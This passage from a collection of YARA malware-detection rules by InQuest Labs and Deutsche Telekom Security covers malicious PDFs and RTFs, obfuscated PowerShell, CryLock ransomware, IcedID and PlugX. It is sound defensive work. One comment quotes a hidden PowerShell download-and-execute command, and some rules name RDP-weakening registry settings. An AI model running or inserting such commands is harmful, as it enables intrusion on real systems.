        samples        = "c2f2d1de6bf973b849725f1069c649ce594a907c1481566c0411faba40943ee5"

	strings:
			
		$pdf_header = "%PDF-"
		$launch = "/Launch" nocase
        
	condition:
			
		$pdf_header in (0..1024) and $launch

}
rule PDF_with_Embedded_RTF_OLE_Newlines
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects suspicious PDF files embedded with RTF files that contain embedded OLE content that injects newlines into embedded OLE contents as a means of payload obfuscation and detection evasion."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "InQuest Internal Research"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "d784c53b8387f1e2f1bcb56a3604a37b431638642e692540ebeaeee48c1f1a07"

 	strings:
			$rtf_magic = "{\\rt"  // note that {\rtf1 is not required
                
$rtf_objdata = /\x7b[^\x7d]*\\objdata/ nocase
        
$nor = "D0CF11E0A1B11AE1" nocase
        
$obs = /D[ \r\t\n]*0[ \r\t\n]*C[ \r\t\n]*F[ \r\t\n]*1[ \r\t\n]*1[ \r\t\n]*E[ \r\t\n]*0[ \r\t\n]*A[ \r\t\n]*1[ \r\t\n]*B[ \r\t\n]*1[ \r\t\n]*1[ \r\t\n]*A[ \r\t\n]*E[ \r\t\n]*1/ nocase
	condition:
			$rtf_magic and $rtf_objdata and ($obs and not $nor)
}
rule PDF_with_Launch_Action_Function
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects the launch function within a PDF file. This function allows the document author to attach an executable file."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://blog.didierstevens.com/2010/03/29/escape-from-pdf/"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "a9fbb50dedfd84e1f4a3507d45b1b16baa43123f5ae98dae6aa9a5bebeb956a8"

	strings:
			
		$pdf_header = "%PDF-"
		$a = "<</S/Launch/Type/Action/Win<</F"
	condition:
			
		$pdf_header in (0..1024) and $a

}rule Powershell_Case
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects suspicious letter casing used on PowerShell commands to evade detection. While PowerShell is generally case-insensitive, some malware authors will use unusual spacing on malicious PowerShell payloads to obfuscate them or to attempt to evade detection."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier"
        labs_reference = "https://labs.inquest.net/dfi/sha256/94c06f59af1a350c23df036aeae29e25dc7a0ccf9df5a0384e6dd2c05a62cc25"
        labs_pivot     = "N/A"
        samples        = "1c4972aaf29928e7d2e58ccdbfca23ad4f48c332cf7b63e8e55427ed0d2e7d6c"

	strings:
	$magic1 = "INQUEST-PII"
	        $ps_normal1 = /(powershell|POWERSHELL|Powershell|PowerShell|powerShell)/ fullword
        	$ps_normal2 = /(p.o.w.e.r.s.h.e.l.l|P.O.W.E.R.S.H.E.L.L|P.o.w.e.r.s.h.e.l.l|P.o.w.e.r.S.h.e.l.l|p.o.w.e.r.S.h.e.l.l)/ fullword
	        $ps_wide1   = "powershell" fullword nocase
        	$ps_wide2   = /p.o.w.e.r.s.h.e.l.l/ fullword nocase
	condition:
	        (($ps_wide1 and not $ps_normal1) or ($ps_wide2 and not $ps_normal2)) and not ($magic1 in (filesize-30 .. filesize))
}rule Powershell_Command_Fileless_August_Malware
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects content that indicates the presence of August malware."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://www.proofpoint.com/us/threat-insight/post/august-in-december-new-information-stealer-hits-the-scene"
        labs_reference = "https://labs.inquest.net/dfi/sha256/94c06f59af1a350c23df036aeae29e25dc7a0ccf9df5a0384e6dd2c05a62cc25"
        labs_pivot     = "https://labs.inquest.net/dfi/search/alert/Hidden%20Powershell"
        samples        = "94c06f59af1a350c23df036aeae29e25dc7a0ccf9df5a0384e6dd2c05a62cc25"

	strings:
			$ps_bypass = "bypass" nocase
	        $ps_webclient = "Net.WebClient" nocase
	        $ps_nop = "-nop" nocase
	        $ps_downloadfile = "DownloadFile" nocase
	        $ps_iex = "iex" nocase
	        $url = /https?:/ nocase
	
	/*
	-w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://[URL].asp') | iex
	*/
	condition:
			all of them
}rule RTF_Anti_Analysis_Header
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects strings found in malicious RTF documents"
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://decalage.info/rtf_tricks"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "08d7cef89f944e90fa8afb2114cd31dea1dd8de7f144ddccb6ce590c0738ffc5"

	strings:
			
		$r1 = /[\x0d\x0aa-f0-9\s]{64}(\{\\object\}|\\bin)[\x0d\x0aa-f0-9\s]{64}/ nocase
	condition:
			
		uint32(0) == 0x74725C7B and (not uint8(4) == 0x66 or $r1)

}rule RTF_Composite_Moniker
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects an attempt to exploit the CVE-2017-8570 vulnerability. A remote code execution vulnerability exists in Microsoft Office software when it fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could use a specially crafted file to perform actions in the security context of the current user."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "InQuest Labs Empirical Observations"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "bbec59b5557a9836306dd487294bac62227be2f0e7b56c3aeccd6415bfff82a6"

	strings:
			$magic_rtf = "{\\rt" nocase
        $st1 = "0903000000000000C000000000000046" nocase // Composite Moniker
        $st2 = "0303000000000000C000000000000046" nocase // File Moniker
        $st3 = "C6AFABEC197FD211978E0000F8757E2A" nocase // "new" Moniker
        $st4 = "01004F006C0065" nocase // "\x01Ole"
	condition:
			$magic_rtf at 0 and all of ( $st* )
}rule RTF_Embedded_OLE_Header_Obfuscated
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects suspicious RTF files with embedded OLE documents but the OLE header is obfuscated. This is highly indicative of suspicious behavior done to evade detection"
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "c96c560aae3440a7681d24fa53a296c695392ca8edb35043430c383efcd69190"

	strings:
	$rtf_magic = "{\\rt"  // note that {\rtf1 is not required
	
	$obfuscated = /\x7b[^\x7d]*\\object[^\x7d]*\\objemb[^\x7d]*\\objdata[^\x7d]+D[\x09-\x7f]*0[\x09-\x7f]*C[\x09-\x7f]*F[\x09-\x7f]*1[\x09-\x7f]*1[\x09-\x7f]*E[\x09-\x7f]*0[\x09-\x7f]*A[\x09-\x7f]*1[\x09-\x7f]*B[\x09-\x7f]*1[\x09-\x7f]*1[\x09-\x7f]*A[\x09-\x7f]*E[\x09-\x7f]*1/ nocase wide ascii
	
	$normal = /\x7b[^\x7d]*\\object[^\x7d]*\\objemb[^\x7d]*\\objdata[^\x7d]+D0CF11E0A1B11AE1/ nocase wide ascii
	
	condition:
			$rtf_magic in (0..10) and $obfuscated and not $normal
}
rule RTF_File_Malformed_Header
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects compound RTF documents with malformed headers which is typically an indication of attackers trying to evade detection."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "InQuest Labs Empirical Observations"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "e3b5cf3c05d824634d2748fac40216275e7f9f47c94dfa4dfa89f976841698bd"

	strings:
        $rtf_header1 = /^.{0,10}{\\rtf[a-z0-9\x5c]+[@='"\x2f()~!#$%^&*_+=|;:,<.>?\x80-\xff\x2d\x5b\x5d\x60]+[a-z0-9]+[@='"\x2f()~!#$%^&*_+=|;:,<.>?\x80-\xff\x2d\x5b\x5d\x60]+[a-z0-9]+[@='"\x2f()~!#$%^&*_+=|;:,<.>?\x80-\xff\x2d\x5b\x5d\x60]/ nocase 
        
        $rtf_header2 = /^.{0,10}{\\rtf[a-z0-9]+[^\{\}\x0d\x0a]{100,}/ nocase  // note that {\rtf1 is not required
	condition:
			all of ($rtf_header*)
}rule RTF_Header_Obfuscation
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects RTF files that have malformed headers. Threat actors often use such obscure methods to evade detection and deliver malicious payloads."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "InQuest Labs Empirical Observations"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "f40ff37276a3da414c36789f640e38f3b3b574c6b5811cd3eb55a9cccb3eb9c8"

	strings:
			$bad_header = /^{\\rt[^f]/
	condition:
			$bad_header
}rule RTF_Memory_Corruption_Vulnerability
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects a specially crafted RTF file that is designed to trigger a memory corruption vulnerability in the RTF parsing code that would allow an attacker to execute arbitrary code. The successful exploitation of this vulnerability gains the same user rights as the current user."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://technet.microsoft.com/en-us/security/advisory/2953095"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "a5d921242a81b65d111fe4009d62c6166f7b29762e7a037ee790bf3ee5320da4"

	strings:
			
		$badHdr = "{\\rt{"
		$ocxTag = "\\objocx\\"
		$mscomctl = "MSComctlLib."
		$rop = "?\\u-554"
	condition:
			
		$badHdr and $ocxTag and $mscomctl and #rop>8

}rule RTF_Objupdate
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects RTF files with an 'objupdate' directive. While not guaranteed to be malicious this signature has proven effective for threat hunting in the field."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://www.biblioscape.com/rtf15_spec.htm"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "eaaefa41eaaeac943dede195f3a00b1e424d152cf08243d023009fafdfa6c52b"

	strings:
			
        $magic1= {7b 5c 72 74 (7B | 66)} // {\rtf{ or {\rt{
        $upd = "\\objupdate" nocase

	condition:
			
        $magic1 in (0..30) and $upd and filesize > 50KB and filesize < 500KB

}rule RTF_with_Suspicious_File_Extension
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects RTF files with an 'objdata' directive and a reference to a file extension deemed as executable."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://www.biblioscape.com/rtf15_spec.htm"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "14ab1a85b0d6791f15952da15706b7997dd6ebdbbc9aea816e90f6009feb4b3c"

	strings:
			// '{\rt' (note that full header is *NOT* required: '{\rtf1')
        $magic = "{\\rt"

        $objstuff = /\\obj(data|update)/

        $ext_00 = /2e[46]5[57]8[46]500/ nocase     // .exe\x00
        $ext_01 = /2e[57]3[46]3[57]400/ nocase     // .sct\x00
        $ext_02 = /2e[57]3[46]3[57]200/ nocase     // .scr\x00
        $ext_03 = /2e[46]2[46]1[57]400/ nocase     // .bat\x00
        $ext_04 = /2e[57]0[57]33100/    nocase     // .ps1\x00
        $ext_05 = /2e[46]3[46]f[46]d00/ nocase     // .com\x00
        $ext_06 = /2e[46]3[46]8[46]d00/ nocase     // .chm\x00
        $ext_07 = /2e[46]8[57]4[46]100/ nocase     // .hta\x00
        $ext_08 = /2e[46]a[46]1[57]200/ nocase     // .jar\x00
        $ext_09 = /2e[57]0[46]9[46]600/ nocase     // .pif\x00
        $ext_10 = /2e[57]6[46]2[57]300/ nocase     // .vbs\x00
        $ext_11 = /2e[57]6[46]2[46]500/ nocase     // .vbe\x00
	condition:
			$magic at 0 and $objstuff and any of ($ext*)
}
rule Suspicious_CLSID_RTF
{
    meta:
        author         = "InQuest Labs"
        description    = "This rule detects RTF documents that have an unusual incidence of hex within the OLECLSID control word."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "InQuest Internal Research"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "3126f973a80dd2c1cd074f6631d5a36c480b6d5d75d26a02f2f35bc2a62b80f7"

	strings:
			
    $rtf_magic = "{\\rt"  // note that {\rtf1 is not required

    $re1 = /\x7b[^\x7d]{0,10}\\oleclsid[ \t\r\n]+[a-z0-9\x2e\x2d]{0,15}\\\x27[2-7][0-9a-f][a-z0-9\x2e\x2d]{0,15}\\\x27[2-7][0-9a-f][a-z0-9\x2e\x2d]{0,15}\\\x27[2-7][0-9a-f]/ nocase wide ascii
	condition:
			
    $rtf_magic in (0..30) and all of ($re*)


}rule Windows_API_Function
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://en.wikipedia.org/wiki/Windows_API"
        labs_reference = "https://labs.inquest.net/dfi/hash/f9b62b2aee5937e4d7f33f04f52ad5b05c4a1ccde6553e18909d2dc0cb595209"
        labs_pivot     = "N/A"
        samples        = "f9b62b2aee5937e4d7f33f04f52ad5b05c4a1ccde6553e18909d2dc0cb595209"

	strings:
			$magic  = "INQUEST-PII="
	$api_00 = "LoadLibraryA" nocase ascii wide
    $api_01 = "ShellExecuteA" nocase ascii wide
    $api_03 = "GetProcAddress" nocase ascii wide
    $api_04 = "GetVersionExA" nocase ascii wide
    $api_05 = "GetModuleHandleA" nocase ascii wide
    $api_06 = "OpenProcess" nocase ascii wide
    $api_07 = "GetWindowsDirectoryA" nocase ascii wide
    $api_08 = "lstrcatA" nocase ascii wide
    $api_09 = "GetSystemDirectoryA" nocase ascii wide
    $api_10 = "WriteFile" nocase ascii wide
    $api_11 = "ReadFile" nocase ascii wide
    $api_12 = "GetFileSize" nocase ascii wide
    $api_13 = "CreateFileA" nocase ascii wide
    $api_14 = "DeleteFileA" nocase ascii wide
    $api_15 = "CreateProcessA" nocase ascii wide
    $api_16 = "GetCurrentProcessId" nocase ascii wide
    $api_17 = "RegOpenKeyExA" nocase ascii wide
    $api_18 = "GetStartupInfoA" nocase ascii wide
    $api_19 = "CreateServiceA" nocase ascii wide
    $api_20 = "CopyFileA" nocase ascii wide
    $api_21 = "GetModuleFileNameA" nocase ascii wide
    $api_22 = "IsBadReadPtr" nocase ascii wide
    $api_23 = "CreateFileW" nocase ascii wide
    $api_24 = "SetFilePointer" nocase ascii wide
    $api_25 = "VirtualAlloc" nocase ascii wide
    $api_26 = "AdjustTokenPrivileges" nocase ascii wide
    $api_27 = "CloseHandle" nocase ascii wide
    $api_28 = "CreateFile" nocase ascii wide
    $api_29 = "GetProcAddr" nocase ascii wide
    $api_30 = "GetSystemDirectory" nocase ascii wide
    $api_31 = "GetTempPath" nocase ascii wide
    $api_32 = "GetWindowsDirectory" nocase ascii wide
    $api_33 = "IsBadReadPtr" nocase ascii wide
    $api_34 = "IsBadWritePtr" nocase ascii wide
    $api_35 = "LoadLibrary" nocase ascii wide
    $api_36 = "ReadFile" nocase ascii wide
    $api_37 = "SetFilePointer" nocase ascii wide
    $api_38 = "ShellExecute" nocase ascii wide
    $api_39 = "UrlDownloadToFile" nocase ascii wide
    $api_40 = "WinExec" nocase ascii wide
    $api_41 = "WriteFile" nocase ascii wide
    $api_42 = "StartServiceA" nocase ascii wide
    $api_43 = "VirtualProtect" nocase ascii wide
	condition:
			any of ($api*)
    and not $magic in (filesize-30..filesize)
    and not 
    (
        /* trigger = 'MZ' */
        (uint16be(0x0) == 0x4d5a)
        or
        /* trigger = 'ZM' */
        (uint16be(0x0) == 0x5a4d)
        or
        /* trigger = 'PE' */
        (uint16be(uint32(0x3c)) == 0x5045)
    )
}rule Word_Document_with_Suspicious_Metadata
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects suspicious metadata within a Microsoft Word document. Document properties, also known as metadata, are details about a file that describe or identify it. Document properties include details such as title, author name, operator, subject, and keywords that identify the document's topic or contents."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://www.schneier.com/blog/archives/2005/11/metadata_in_ms.html"
        labs_reference = "https://labs.inquest.net/dfi/sha256/db0037a9753c364022af4bb7d578996b78ccc3c28b01c6632ccd95a69d49d67c"
        labs_pivot     = "https://labs.inquest.net/dfi/search/alert/Suspicious%20XMP%20Identifier"
        samples        = "db0037a9753c364022af4bb7d578996b78ccc3c28b01c6632ccd95a69d49d67c"

	strings:
			$rtf1 = /^\x7b\x5c\x72\x74/   /* {\\rt */
		$rtf2 = "Microsoft Office Word"
		$a0 = { 07 74 6E 61 75 74 68 6F 72 20 4A 6F 68 6E 20 44 6F 65 7D }
		$a1 = "Vjkygdjdtyuj" nocase
		$a2 = "{\\*\\company \\'ce\\'a2\\'c8\\'ed\\'d6\\'d0\\'b9\\'fa"
		$a3 = "{\\author author000}"
		$a4 = "{\\operator author000}"
		$a5 = "{\\*\\company google}"
		$a7 = "Tran Duy Linh"
		$a8 = "DLC Corporation"
		$a9 = "{\\author testhome}"
		$a10 = "{\\operator testhome}"
		$a11 = "{\\author Nkosi Moyo"
		$a12 = "{\\operator Victor Ignatiev"
		$a13 = "{\\*\\company ECOBANK}"
		$a14 = "{\\title Your Company Name}"
		$a15 = "{\\author Geoffrey Draper}"
		$a16 = "{\\*\\company Le Grand Marketing}"
		$a17 = "{\\author kirichek"
		$a18 = "{\\title \\'c1\\'cb\\'c0\\'cd\\'ca \\'c7\\'c0\\'ca\\'c0\\'c7\\'c0}"
		$a19 = "{\\operator admin}"
		$a20 = "{\\author joy}"
		$a21 = "{\\operator PMALO}"
		$a23 = "{\\operator test}"
		$a24 = "{\\author Stone"
		$a25 = "{\\operator Stone"
		$a26 = "{\\title A* }"
		$a27 = "{\\author xxxxxxxxx}"
		$a28 = "{\\operator xxxxxxxxx}"
		$a29 = "{\\author xxx}"
		$a30 = "{\\operator xxx}"
		$a31 = "{\\*\\company 1stconsult}"
		$a32 = "{\\author user}"
		$a33 = "{\\operator user}"
		$a34 = "{\\*\\company ooo}"
		$a35 = "{\\author \\'cf\\'e0\\'e2\\'e5\\'eb}"
		$a36 = "{\\operator 1}"
		$a37 = "{\\author blursight}"
		$a38 = "{\\operator blursight}"
		$a39 = "{\\author MC SYSTEM}"
		$a40 = "{\\operator MC SYSTEM}"
		$a41 = "{\\*\\company MC SYSTEM}"
		$a42 = "{\\author Work}"
		$a43 = "{\\operator JSman}"
		$a44 = "{\\*\\company Grizli777}"
		$a45 = "{\\author wingdbg}"
		$a46 = "{\\operator wingdbg}"
		$a47 = "{\\author Dmk}"
		$a48 = "{\\operator Dmk}"
		$a49 = "{\\author TSEEDUP}"
		$a50 = "{\\author conqueror}"
		$a51 = "{\\operator conqueror}"
		$mil1 = "\\0CF11E0A1B11AE10000000"
		$mil2 = "\\author abc}{\\operator abc"
		$mil3 = "{\\info{\\title  }{\\author admin"
		$mil4 = "title AAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAA}{\\author bbk}"
		$mil5 = "{\\author Microsoft"
		$mil6 = "{\\creatim\\yr2010\\mo11\\dy29\\hr16\\min35}"
		$mil7 = "author xp"
		$mil10 = "D0CF11E0A1B11AE"
		$mil11 = "\\info{itle Template}{uthor John Doe}}"
		$mil12 = "\\title aaa"
		$mil13 = "tnauthor leeyth"
	condition:
			1 of ($rtf*) and any of ($a*,$mil*)
}
rule Crylock_binary {
   meta:
      description = "Detects CryLock ransomware v2.3.0.0"
      author = "Thomas Barabosch, Telekom Security"
      reference = "TBA"
      date = "2021-06-28"
   strings:
      $s1 = "how_to_decrypt.hta" ascii
      $s2 = "UAC annoy and ask admin rights" ascii
      $s3 = "<%UNDECRYPT_DATETIME%>" ascii
      $s4 = "<%RESERVE_CONTACT%>" ascii
      $s5 = "<%MAIN_CONTACT%>" ascii
      $s6 = "<%HID%>" ascii
      $s7 = "Get local IPs list" ascii
      $s8 = "Get password hash" ascii
      $s9 = "END PROCESSES KILL LIST" ascii
      $s10 = "CIS zone detected" ascii
      $s11 = "Launch encryption threads..." ascii
      $s12 = "FastBlackRabbit" ascii
      $s13 = "Preliminary password hash calculation" ascii
      $s14 = "Encrypted:" ascii
   condition:
      uint16(0) == 0x5a4d
      and filesize > 150KB
      and filesize < 1MB
      and 8 of ($s*)
}

rule Crylock_hta {
   meta:
      description = "Detects CryLock ransomware how_to_decrypt.hta ransom note"
      author = "Thomas Barabosch, Telekom Security"
      reference = "TBA"
      date = "2021-06-28"
   strings:
      $s1 = "var main_contact =" ascii
      $s2 = "var max_discount =" ascii
      $s3 = "<title>CryLock</title>" ascii
      $s4 = "var discount_date = new Date(" ascii
      $s5 = "var main_contact =" ascii
      $s6 = "var hid = " ascii
      $s7 = "var second_contact = " ascii
      $s8 = "document.getElementById('main_contact').innerHTML = main_contact;" ascii
      $s9 = "document.getElementById('second_contact').innerHTML = second_contact;" ascii
      $s10 = "document.getElementById('hid').innerHTML = hid;" ascii
      $s11 = "be able to decrypt your files. Contact us" ascii
      $s12 = "Attention! This important information for you" ascii
      $s13 = "higher will become the decryption key price" ascii
      $s14 = "Before payment, we can decrypt three files for free." ascii
   condition:
      filesize < 100KB
      and 8 of ($s*)
}
rule android_flubot {
    meta:
        author = "Thomas Barabosch, Telekom Security"
        version = "20210720"
        description = "matches on dumped, decrypted V/DEX files of Flubot version > 4.2"
        sample = "37be18494cd03ea70a1fdd6270cef6e3"

    strings:
        $dex = "dex"
        $vdex = "vdex"
        $s1 = "LAYOUT_MANAGER_CONSTRUCTOR_SIGNATURE"
        $s2 = "java/net/HttpURLConnection;"
        $s3 = "java/security/spec/X509EncodedKeySpec;"
        $s4 = "MANUFACTURER"

    condition:
        ($dex at 0 or $vdex at 0)
        and 3 of ($s*)
}
rule rdp_enable_multiple_sessions: capability hacktool
{
     meta:
        author = "Thomas Barabosch, Deutsche Telekom Security"
        description = "Enable RDP/Multiple User Sessions"
        date = "2022-01-14"
        reference = "https://docs.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-localsessionmanager-fdenytsconnections"
        reference2 = "https://serverfault.com/questions/822503/enable-rdp-for-multiple-sessions-command-line-option"
     strings:
        $a = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" ascii wide
        $b = "fDenyTSConnections" ascii wide
        $c = "fSingleSessionPerUser" ascii wide
     condition:
        ($a and $b) or ($a and $c)
}

rule rdp_change_port_number: capability hacktool
{
     meta:
        author = "Thomas Barabosch, Deutsche Telekom Security"
        description = "Change RDP port number"
        date = "2022-01-14"
        reference = "https://helgeklein.com/blog/programmatically-determining-terminal-server-mode-on-windows-server-2008/"
     strings:
        $a = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" ascii wide
        $b = "PortNumber"
     condition:
        all of them
}

rule allow_rdp_session_without_password: capability hacktool
{
    meta:
        author = "Thomas Barabosch, Deutsche Telekom Security"
    	description = "Remote Desktop Connection without password, e.g. seen in SDBBot / TA505"
        date = "2022-01-14"
        reference = "https://www.speedguide.net/faq/how-to-connect-using-remote-desktop-without-a-password-435"
    strings:
		$a = "LimitBlankPasswordUse" ascii wide
    condition:
    	$a
}

rule get_windows_proxy_configuration: capability hacktool
{
    meta:
        author = "Thomas Barabosch, Deutsche Telekom Security"
    	description = "Queries Windows Registry for proxy configuration"
        date = "2022-01-14"
        reference = "https://docs.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-ie-clientnetworkprotocolimplementation-hklmproxyserver"
    strings:
		$a = "Software\\Microsoft\\Windows\\Currentversion\\Internet Settings" ascii wide
		$b = "ProxyEnable" ascii wide
		$c = "ProxyServer" ascii wide
    condition:
    	all of them
}

rule cn_utf8_windows_terminal: capability hacktool
{
    meta:
        author = "Thomas Barabosch, Deutsche Telekom Security"
    	description = "This is a (dirty) hack to display UTF-8 on Windows command prompt."
        date = "2022-01-14"
        reference = "https://dev.to/mattn/please-stop-hack-chcp-65001-27db"
        reference2 = "https://www.bitdefender.com/files/News/CaseStudies/study/401/Bitdefender-PR-Whitepaper-FIN8-creat5619-en-EN.pdf"
    strings:
		$a = "chcp 65001" ascii wide
    condition:
    	$a
}

rule potential_termserv_dll_replacement: capability hacktool
{
    meta:
        author = "Thomas Barabosch, Deutsche Telekom Security"
    	description = "May replace termserv.dll to allow for multiple RDP sessions"
        date = "2022-01-14"
        reference = "https://www.mysysadmintips.com/windows/clients/545-multiple-rdp-remote-desktop-sessions-in-windows-10"
    strings:
		$a = "termsrv.dll" ascii wide
    condition:
    	$a
}
rule fake_gzip_bokbot_202104
{
meta:
        author = "Thomas Barabosch, Telekom Security"
        date = "2021-04-20"
        description = "fake gzip provided by CC"
strings:
        $gzip = {1f 8b 08 08 00 00 00 00 00 00 75 70 64 61 74 65}
condition:
        $gzip at 0
}


rule win_iceid_gzip_ldr_202104 {
   meta:
      author = "Thomas Barabosch, Telekom Security"
      date = "2021-04-12"
      description = "2021 initial Bokbot / Icedid loader for fake GZIP payloads"
   strings:
      $internal_name = "loader_dll_64.dll" fullword

      $string0 = "_gat=" wide
      $string1 = "_ga=" wide
      $string2 = "_gid=" wide
      $string3 = "_u=" wide
      $string4 = "_io=" wide
      $string5 = "GetAdaptersInfo" fullword
      $string6 = "WINHTTP.dll" fullword
      $string7 = "DllRegisterServer" fullword
      $string8 = "PluginInit" fullword
      $string9 = "POST" wide fullword
      $string10 = "aws.amazon.com" wide fullword
   condition:
      uint16(0) == 0x5a4d and
      filesize < 5000KB and 
      ( $internal_name or all of ($s*) )
      or all of them
}

rule win_iceid_core_ldr_202104 {
   meta:
        author = "Thomas Barabosch, Telekom Security"
        date = "2021-04-13"
        description = "2021 loader for Bokbot / Icedid core (license.dat)"
   strings:
        $internal_name = "sadl_64.dll" fullword

        $string0 = "GetCommandLineA" fullword
        $string1 = "LoadLibraryA" fullword
        $string2 = "ProgramData" fullword
        $string3 = "SHLWAPI.dll" fullword
        $string4 = "SHGetFolderPathA" fullword
        $string5 = "DllRegisterServer" fullword
        $string6 = "update" fullword
        $string7 = "SHELL32.dll" fullword
        $string8 = "CreateThread" fullword
   condition:
      uint16(0) == 0x5a4d and
      filesize < 5000KB and 
      ( $internal_name and 5 of them )
      or all of them
}

rule win_iceid_core_202104 {
   meta:
      author = "Thomas Barabosch, Telekom Security"
      date = "2021-04-12"
      description = "2021 Bokbot / Icedid core"
   strings:
      $internal_name = "fixed_loader64.dll" fullword

      $string0 = "mail_vault" wide fullword
      $string1 = "ie_reg" wide fullword
      $string2 = "outlook" wide fullword
      $string3 = "user_num" wide fullword
      $string4 = "cred" wide fullword
      $string5 = "Authorization: Basic" fullword
      $string6 = "VaultOpenVault" fullword
      $string7 = "sqlite3_free" fullword
      $string8 = "cookie.tar" fullword
      $string9 = "DllRegisterServer" fullword
      $string10 = "PT0S" wide
   condition:
      uint16(0) == 0x5a4d and
      filesize < 5000KB and 
      ( $internal_name or all of ($s*) )
      or all of them
}
import "math"

rule win_plugx_encrypted_hunting {
   meta:
      description = "Detects encrypted PlugX payloads"
      author = "Thomas Barabosch, Telekom Security"
      date = "2021-10-29"
      hash1 = "6b8081606762a2a9b88e356c9e3669771ac8bb6aaf905050b9ecd0b490aa2466"
      hash2 = "8ec409c1537e3030405bc8f8353d2605d1e88f1b245554383682f3aa8b5100ec"
      hash3 = "acfd58369c0a7dbc866ad4ca9cb0fe69d017587af88297f1eaf62a9a8b1b74b4"
      hash4 = "27ea939f41712a8655dc2dc0bce7d32a85e73a341e52b811b109befc043e762a"
      hash5 = "8889d2b18fb368fbfc16f622fcc20df1b9e522c2bada0195f9a812867f6bad91"
      hash6 = "d8882948a7fe4b16fb4b7c16427fbdcf0f0ab8ff3c4bac34f69b0a7d4718183e"
      further_reading = "https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.120.9861&rep=rep1&type=pdf"
   condition:

      math.in_range(math.mean(0, 16), 70.0, 110.0) // there is an ascii string at beginning (== xor key)
      and math.in_range(math.mean(filesize-8, 8), 70.0, 110.0) // the end of the file reflects the xor key since usually (000000...)
      and math.in_range(math.mean(0x300, 256), 70.0, 110.0) // before (unencrypted) .text section there are usually many zeros. These reflect the xor key in the encrypted version.
      and math.in_range(math.mean(0x30, 16), 70.0, 110.0) // since there are many zeros in the PE header, these bytes will have the value of the xor key in the encrypted version.

      and math.in_range(math.entropy(0, 8), 2.0, 4.0) // ensure that the file does not start with zero bytes and hopefully an ASCII key
      and math.in_range(math.entropy(0, 1000), 4.0, 6.0) // check if key repeats due to zero bytes in PE header
      and math.in_range(math.entropy(filesize - 32, 32), 2.0, 4.5) // check if key repeats due to zero bytes at the file end

      and math.entropy(0x410, 176) > 5.0 // entropy of encrypted .TEXT section should be still above 5.0 (see further_reading)
      and math.mean(0x3d0, 48) > 10 // assume that before text section there are no zero bytes in the encrypted version

      and filesize > 70KB
      and filesize < 250KB // check if size is in range for plugx

      and ((math.mean(8, 1) == 0)
           or (math.mean(9, 1) == 0)
           or (math.mean(10, 1) == 0)
           or (math.mean(11, 1) == 0)
           or (math.mean(12, 1) == 0)
           or (math.mean(13, 1) == 0)
           or (math.mean(14, 1) == 0)
           or (math.mean(15, 1) == 0)) // ensure there is a zero terminator of the key somewhere at the beginning, allow key length 9 - 16 bytes.
}
rule win_systembc_20220311 {
    meta:
        author = "Thomas Barabosch, Deutsche Telekom Security"
        twitter = "https://twitter.com/DTCERT"
        description = "Detects unpacked SystemBC module"
        date = "20220311"
        sharing = "TLP:WHITE"
